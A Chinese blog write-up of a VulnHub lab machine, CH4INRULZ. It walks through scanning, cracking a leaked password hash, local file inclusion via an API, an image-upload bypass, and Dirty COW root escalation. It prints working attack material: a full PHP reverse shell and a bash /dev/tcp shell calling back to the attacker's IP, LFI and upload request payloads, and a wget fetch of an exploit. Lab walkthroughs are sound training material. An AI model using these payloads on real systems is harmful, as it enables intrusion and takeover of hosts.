---
title: "vulnhub靶机渗透CH4INRULZ_v1.0.1"
onlyTitle: true
date: 2023-06-29 13:05:36
categories:
- 内网渗透
- 靶机
tags:
- 内网渗透
- vulnhub
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B875.png
---



# CH4INRULZ_v1.0.1

## 一、有效资产收集

| 资产编号         | 资产分类 | 资产名称       | 资产规格                                                     | 访问地址        | 备注/问题                                                    |
| ---------------- | -------- | -------------- | ------------------------------------------------------------ | --------------- | ------------------------------------------------------------ |
| CH4INRULZ_v1.0.1 | 主机系统 | Ubuntu操作系统 | Type:Linux<br />IP:192.168.101.133<br />Port:21、22、80、8081 | 192.168.101.133 | openssh版本较低，web备份信息泄露导致的后台可登录。文件上传漏洞。脏牛提权 |

靶机flag:==8f420533b79076cc99e9f95a1a4e5568==

靶机地址：https://download.vulnhub.com/ch4inrulz/CH4INRULZ_v1.0.1.ova

## 二、渗透测试过程

kali攻击机ip为192.168.101.128

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png)



### （1）信息收集

* 通过netdiscover进行二层发现，发现地址为192.168.101.133主机

```sh
netdiscover -r 192.168.101.0/24
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092713572.png)

这个工具我在第二次扫的时候一直扫不出来，扫不出来就arp-scan

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626164847570.png)



* 通过ping进行三层发现，根据ttl=64初步推测该主机为Linux

```sh
ping 192.168.101.133
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092952688.png)

* 通过masscan四层发现目标主机开放端口

```sh
masscan -p0-65535 --rate=10000 192.168.101.133
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626093143394.png)

目标主机开启了80web服务端口，22ssh端口，8011web端口，21ftp端口



* 扫描目标端口服务

  ```sh
  nmap -A -p- -sC -T4 -sS -P0 192.168.101.133 -oN nmap.A
  ```


![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094024734.png)

* 目标开启了以下端口及服务：
  * 21端口，服务为vsftpd 2.3.5;
  * 22端口，服务为OpenSSH 5.9p1;且系统为Debian 5 的ubuntu1.10
  * 80端口，服务为Apacha 2.2.22
  * 8011端口，服务和80端口一样



使用Nmap中漏洞分类NSE脚本对目标进行探测

```sh
nmap -sV --script vuln 192.168.101.133
```

****

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094353403.png)

openssh和web服务都存在相应的CVE和对应的exp

访问目标web服务：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094818002.png)

对其web服务进行目录扫描：

```sh
dirb http://192.168.101.133
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100221981.png)

没有有效的信息，development处需要登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100304688.png)

用御剑扫出了目标存在index.html.bak，下载下来

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100635084.png)

bak为如下文件，`frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0`似乎就是用户名和密码

```html
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
<a href="/development">development</a>
<!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path -->
</body></html>
```

新建一个1.txt，把`frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0`写进1.txt，用john工具解密，解密出密码为frank!!!

```sh
john 1.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101149865.png)

此时再去development登录，登录成功，显示以下界面：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101350050.png)

提示具有文件上传接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101500282.png)

再扫一遍发现uploader目录，后续就是想办法文件上传进后台了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101449725.png)





在exploit-db上搜索ssh对应版本的漏洞，或者searchspolit，目标服务器的openssh有用户名枚举漏洞

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png)



seebug上看到目标主机存在信息泄露和缓冲区溢出漏洞，还有2010年的拒绝服务漏洞（因该漏洞等级较低，实施拒绝服务也较困难所以无视）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png)

==192.168.101.133主机的22端口存在信息泄露和缓冲区溢出漏洞，seebug还有searchspolit都能找到对应的poc，该轮信息扫描可以用来进行下一步的ssh爆破或溢出漏洞攻击。该信息泄露漏洞也定义为中危。==

==同时，该主机web服务目录扫描出development目录和index.html.bak备份文件泄露，文件解密后可以获得后台登录的用户名和密码，进而继续文件上传攻击。由于攻击复杂性和后续危害性未知，但是爆破密码成功，定义为中危==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png)



### （2）文件上传及api获取shell

访问192.168.101.133/development/uploader/

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626165850566.png)

随便上传一个php文件，提示：

```
File is not an image.Sorry, only JPG, JPEG, PNG & GIF files are allowed.Sorry, your file was not uploaded. 
```

上BP发现PHP怎么都传不上。

先放弃文件上传



#### api

访问192.168.101.133:8011也就是另一个web端口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170634258.png)

目录扫描，上dirb：发现/api/目录，该8011端口是对80端口web服务提供的一些api

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170800999.png)

对下列四个api逐个访问，发现只有files_api.php可用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170836976.png)



提示需要传递file的参数，并且该api不使用json，以原始格式发送文件名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171114731.png)

猜测该api为文件访问的api，POST数据：

```http
POST /api/files_api.php HTTP/1.1
Host: 192.168.101.133:8011
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

file=/etc/passwd
```

注意，必须要加`Content-Type:application/w-www-form-urlencoded`表示请求体中的数据是URL编码过的，不然`=`会解析错误(猜的)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171820840.png)



读取apacha的配置文件：

```xml
file=/etc/apache2/sites-enabled/000-default
```

找到development的路径在`/var/www/development`，相应的upload.php就在`/var/www/development/uploader/upload.php`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626172128787.png)

直接读取upload.php，发现直接执行了该文件，那就试试伪协议：

```py
file=php://filter/read=convert.base64-encode/resource=/var/www/development/uploader/upload.php
```

返回结果如下：

```
PD9waHAKJHRhcmdldF9kaXIgPSAiRlJBTkt1cGxvYWRzLyI7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gYmFzZW5hbWUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSk7CiR1cGxvYWRPayA9IDE7CiRpbWFnZUZpbGVUeXBlID0gc3RydG9sb3dlcihwYXRoaW5mbygkdGFyZ2V0X2ZpbGUsUEFUSElORk9fRVhURU5TSU9OKSk7Ci8vIENoZWNrIGlmIGltYWdlIGZpbGUgaXMgYSBhY3R1YWwgaW1hZ2Ugb3IgZmFrZSBpbWFnZQppZihpc3NldCgkX1BPU1RbInN1Ym1pdCJdKSkgewogICAgJGNoZWNrID0gZ2V0aW1hZ2VzaXplKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJ0bXBfbmFtZSJdKTsKICAgIGlmKCRjaGVjayAhPT0gZmFsc2UpIHsKICAgICAgICBlY2hvICJGaWxlIGlzIGFuIGltYWdlIC0gIiAuICRjaGVja1sibWltZSJdIC4gIi4iOwogICAgICAgICR1cGxvYWRPayA9IDE7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIkZpbGUgaXMgbm90IGFuIGltYWdlLiI7CiAgICAgICAgJHVwbG9hZE9rID0gMDsKICAgIH0KfQovLyBDaGVjayBpZiBmaWxlIGFscmVhZHkgZXhpc3RzCmlmIChmaWxlX2V4aXN0cygkdGFyZ2V0X2ZpbGUpKSB7CiAgICBlY2hvICJTb3JyeSwgZmlsZSBhbHJlYWR5IGV4aXN0cy4iOwogICAgJHVwbG9hZE9rID0gMDsKfQovLyBDaGVjayBmaWxlIHNpemUKaWYgKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJzaXplIl0gPiA1MDAwMDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgaXMgdG9vIGxhcmdlLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIEFsbG93IGNlcnRhaW4gZmlsZSBmb3JtYXRzCmlmKCRpbWFnZUZpbGVUeXBlICE9ICJqcGciICYmICRpbWFnZUZpbGVUeXBlICE9ICJwbmciICYmICRpbWFnZUZpbGVUeXBlICE9ICJqcGVnIgomJiAkaW1hZ2VGaWxlVHlwZSAhPSAiZ2lmIiApIHsKICAgIGVjaG8gIlNvcnJ5LCBvbmx5IEpQRywgSlBFRywgUE5HICYgR0lGIGZpbGVzIGFyZSBhbGxvd2VkLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIENoZWNrIGlmICR1cGxvYWRPayBpcyBzZXQgdG8gMCBieSBhbiBlcnJvcgppZiAoJHVwbG9hZE9rID09IDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgd2FzIG5vdCB1cGxvYWRlZC4iOwovLyBpZiBldmVyeXRoaW5nIGlzIG9rLCB0cnkgdG8gdXBsb2FkIGZpbGUKfSBlbHNlIHsKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICAgICBlY2hvICJUaGUgZmlsZSAiLiBiYXNlbmFtZSggJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSkuICIgaGFzIGJlZW4gdXBsb2FkZWQgdG8gbXkgdXBsb2FkcyBwYXRoLiI7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIlNvcnJ5LCB0aGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHlvdXIgZmlsZS4iOwogICAgfQp9Cj8+Cgo=
```



base64解码后源码如下：

```php
<?php
$target_dir = "FRANKuploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if($check !== false) {
        echo "File is an image - " . $check["mime"] . ".";
        $uploadOk = 1;
    } else {
        echo "File is not an image.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded to my uploads path.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}
?>
```

代码审计可知上传路径：`FRANKuploads/`



在访问upload.php时发现直接执行了php文件，那试试不以php后缀会不会被当作php解析其内容。POST如下数据，文件名为1.gif，加上文件头GIF89a，内容为phpinfo

```http
POST /development/uploader/upload.php HTTP/1.1
Host: 192.168.101.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.101.133/development/uploader/
Content-Type: multipart/form-data; boundary=---------------------------322949819912746147301031583637
Content-Length: 390
Origin: http://192.168.101.133
Authorization: Basic ZnJhbms6ZnJhbmshISE=
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------322949819912746147301031583637
Content-Disposition: form-data; name="fileToUpload"; filename="1.gif"
Content-Type: application/octet-stream

GIF89a
<?php phpinfo(); ?>
-----------------------------322949819912746147301031583637
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------322949819912746147301031583637--

```



访问该gif：看到了phpinfo，证明被解析了。

```
file=/var/www/development/uploader/FRANKuploads/1.gif
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626173407715.png)



kali开个nc监听

```sh
nc -lvvp 4444
```

> 用nvlp参数没弹回来，因为lvvp用于反向连接，常用（用于还未拿到主机shell）
>
> nvlp为监听连接，用于已经拿下主机的shell，再反弹shell，别用，弹不回来，害人

直接反弹shell，文件内容改为下列：

```sh
<?php
$ip = '192.168.101.128';
$port = 4444;
$shell = " /bin/bash" ;
$cmd = "{$shell} -i >& /dev/tcp/{$ip}/{$port} 0>&1";
exec ( $cmd ) ;
?>
```

为什么这个马弹不回来，是因为是文件包含的吗，看到的师傅给个答案

用kali自带的php反向连接马，路径在`/usr/share/webshells/php/php-reverse-shell.php`，修改一下ip和port，转为jpg上传，上传后包含一下

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.101.128';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

弹回shell，权限为www-data

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626181105938.png)

使用python弹回标准shell：

```py
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092501762.png)



或者传一句话马，蚁剑添加数据，并设置httpbody为post数据

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091025994.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091040024.png)



蚁剑连接成功：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091335571.png)



### （3）脏牛提权

`uname -a`发现linux内核为2.6.35

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091730882.png)

**脏牛提权适用的linux Kernel范围**：

```
2.6.22 <= Linux kernel <= 3.9
```

所以该提权方式适用范围很广，到2016年才修复该漏洞



先看一下目标机有无gcc:

```sh
gcc -v
```

有gcc，且版本为4.6.3

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093520949.png)



* 攻击机开启web服务，在github上下载脏牛的exp或者`searchsploit Dirty`：

```
Dirtycow exp:https://github.com/FireFart/dirtycow
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092620126.png)

复制到本地并用python开启web服务(python2和python3不一样)：

```sh
cp /usr/share/exploitdb/exploits/linux/local/40839.c .
python2 -m SimpleHttpServer 8000
python3 -m http.server 8000
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093353738.png)

目标机上下载exp并进行编译：

```sh
wget http://192.168.101.128:8000/40839.c
```

报错，显示该目录无写权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093743542.png)

转到`/tmp`目录重新下载，下载成功：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093931310.png)



编译执行：

```sh
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

> -pthread 表示启用POSIX线程库，用于支持多线程编程
>
> -o 指定生成后的文件
>
> -lcrypt 连接ctypt库，用于支持密码加密算法

成功生成/tmp/passwd.bak后门，并提示输入新密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094407212.png)

输入自己想要的后门密码，可以用该账户登录了：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094617075.png)

* 登录特权账户：

```sh
su firefart
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094719791.png)

* 查看权限：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094745563.png)

* 在/root/root.txt找到flag:

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094857813.png)



flag:==8f420533b79076cc99e9f95a1a4e5568==